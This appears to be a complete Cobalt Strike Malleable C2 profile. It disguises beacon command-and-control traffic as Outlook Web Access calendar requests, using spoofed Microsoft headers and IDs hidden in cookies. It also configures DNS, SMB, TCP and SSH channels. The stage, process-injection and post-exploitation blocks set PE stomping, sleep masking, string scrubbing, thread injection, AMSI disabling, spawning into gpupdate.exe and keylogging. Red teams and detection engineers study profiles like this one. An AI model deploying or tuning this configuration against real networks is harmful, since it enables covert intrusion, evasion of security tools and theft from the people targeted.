#office365 calendar view
#office365 www.office.com redirects to outlook.live.com
#xx0hcd

set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)";

set data_jitter "50";

dns-beacon {
    # Options moved into 'dns-beacon' group in 4.3:
    set dns_idle             "8.8.8.8";
    set dns_max_txt          "220";
    set dns_sleep            "0";
    set dns_ttl              "1";
    set maxdns               "255";
    set dns_stager_prepend   ".wwwds.";
    set dns_stager_subhost   ".e2867.dsca.";
     
    # DNS subhost override options added in 4.3:
    set beacon               "d-bx.";
    set get_A                "d-1ax.";
    set get_AAAA             "d-4ax.";
    set get_TXT              "d-1tx.";
    set put_metadata         "d-1mx";
    set put_output           "d-1ox.";
    set ns_response          "zero";
}

###SMB options###
set pipename "ntsvcs##";
set pipename_stager "scerpc##";
set smb_frame_header "";

###TCP options###
set tcp_port "8000";
set tcp_frame_header "";

###SSH options###
set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
set ssh_pipename "SearchTextHarvester##";

#custom cert
#https-certificate {
#    set keystore "your_store_file.store";
#    set password "your_store_pass";
#}

http-config {
#    set headers "Server, Content-Type, Cache-Control, Connection";
#    header "Connection" "close";
#    header "Cache-Control" "max-age=2";
#    header "Server" "nginx";
    #set "true" if teamserver is behind redirector
    set trust_x_forwarded_for "false";
    
    set block_useragents "curl*,lynx*,wget*";
}

#set headers_remove "image/x-xbitmap, image/pjpeg, application/vnd";

http-get {

    set uri "/owa/";
    
    client {

#	header "Host" "outlook.live.com";
	header "Accept" "*/*";
	header "Cookie" "MicrosoftApplicationsTelemetryDeviceId=95c18d8-4dce9854;ClientId=1C0F6C5D910F9;MSPAuth=3EkAjDKjI;xid=730bf7;wla42=ZG0yMzA2KjEs";
        
        metadata {
            base64url;
            parameter "wa";


        }

	parameter "path" "/calendar";

    }

    server {

	header "Cache-Control" "no-cache";
	header "Pragma" "no-cache";
	header "Content-Type" "text/html; charset=utf-8";
	header "Server" "Microsoft-IIS/10.0";
	header "request-id" "6cfcf35d-0680-4853-98c4-b16723708fc9";
	header "X-CalculatedBETarget" "BY2PR06MB549.namprd06.prod.outlook.com";
	header "X-Content-Type-Options" "nosniff";
	header "X-OWA-Version" "15.1.1240.20";
	header "X-OWA-OWSVersion" "V2017_06_15";
	header "X-OWA-MinimumSupportedOWSVersion" "V2_6";
	header "X-Frame-Options" "SAMEORIGIN";
	header "X-DiagInfo" "BY2PR06MB549";
	header "X-UA-Compatible" "IE=EmulateIE7";
	header "X-Powered-By" "ASP.NET";
	header "X-FEServer" "CY4PR02CA0010";
	header "Connection" "close";
        

        output {
            base64url;
            print;
        }
    }
}

http-post {
    
    set uri "/OWA/";
    set verb "GET";

    client {

#	header "Host" "outlook.live.com";
	header "Accept" "*/*";     
        
        output {
            base64url;
	    parameter "wa";


        }


	#hiding data in cookie value 'wla42='
        id {
            base64url;

	    prepend "wla42=";
	    prepend "xid=730bf7;";
	    prepend "MSPAuth=3EkAjDKjI;";
	    prepend "ClientId=1C0F6C5D910F9;";
	    prepend "MicrosoftApplicationsTelemetryDeviceId=95c18d8-4dce9854;";
	    header "Cookie";


        }
    }

    server {

	header "Cache-Control" "no-cache";
	header "Pragma" "no-cache";
	header "Content-Type" "text/html; charset=utf-8";
	header "Server" "Microsoft-IIS/10.0";
	header "request-id" "6cfcf35d-0680-4853-98c4-b16723708fc9";
	header "X-CalculatedBETarget" "BY2PR06MB549.namprd06.prod.outlook.com";
	header "X-Content-Type-Options" "nosniff";
	header "X-OWA-Version" "15.1.1240.20";
	header "X-OWA-OWSVersion" "V2017_06_15";
	header "X-OWA-MinimumSupportedOWSVersion" "V2_6";
	header "X-Frame-Options" "SAMEORIGIN";
	header "X-DiagInfo" "BY2PR06MB549";
	header "X-UA-Compatible" "IE=EmulateIE7";
	header "X-Powered-By" "ASP.NET";
	header "X-FEServer" "CY4PR02CA0010";
	header "Connection" "close";
        

        output {
            base64;
            print;
        }
    }
}

http-stager {

    set uri_x86 "/rpc";
    set uri_x64 "/Rpc";

    client {
#        header "Host" "outlook.live.com";
	header "Accept" "*/*";
    }

    server {
#headers are defined in the http-config block above, or you can set them manually here.
        #header "Server" "nginx";    

    }


}

###Malleable PE/Stage Block###
stage {
    set checksum        "0";
    set compile_time    "17 Oct 2020 04:32:14";
    set entry_point     "170001";
    #set image_size_x86 "6586368";
    #set image_size_x64 "6586368";
    #set name	        "WWanMM.dll";
    set userwx 	        "false";
    set cleanup	        "true";
    set sleep_mask	"true";
    set stomppe	        "true";
    set obfuscate	"true";
    set rich_header     "";
    
    set sleep_mask "true";
    
    set smartinject "true";
    
    #allocator options include HeapAlloc, MapViewOfFile, VirtualAlloc, or you can use module stomp.
    #set allocator "HeapAlloc";
    set magic_mz_x86 "MZRE";
    set magic_mz_x64 "MZAR";
    set magic_pe "EA";

    set module_x86 "wwanmm.dll";
    set module_x64 "wwanmm.dll";

    transform-x86 {
        #prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
        }

    transform-x64 {
        #prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
        }

    #string "something";
    #data "something";
    #stringw "something"; 
}

###Process Inject Block###
process-inject {

    set allocator "NtMapViewOfSection";		

    set min_alloc "16700";

    set userwx "false";  
    
    set startrwx "true";
        
    transform-x86 {
        #prepend "\x90\x90\x90";
    }
    transform-x64 {
        #prepend "\x90\x90\x90";
    }

    execute {
        #CreateThread;
        #CreateRemoteThread;       

        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";

        SetThreadContext;

        NtQueueApcThread-s;

        #NtQueueApcThread;

        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";

        RtlCreateUserThread;
    }
}

###Post-Ex Block###
post-ex {

    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";

    set obfuscate "true";

    set smartinject "true";

    set amsi_disable "true";
    
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x1000";
    set pipename "DserNamePipe##, PGMessagePipe##, MsFteWds##";
    set keylogger "SetWindowsHookEx";


}
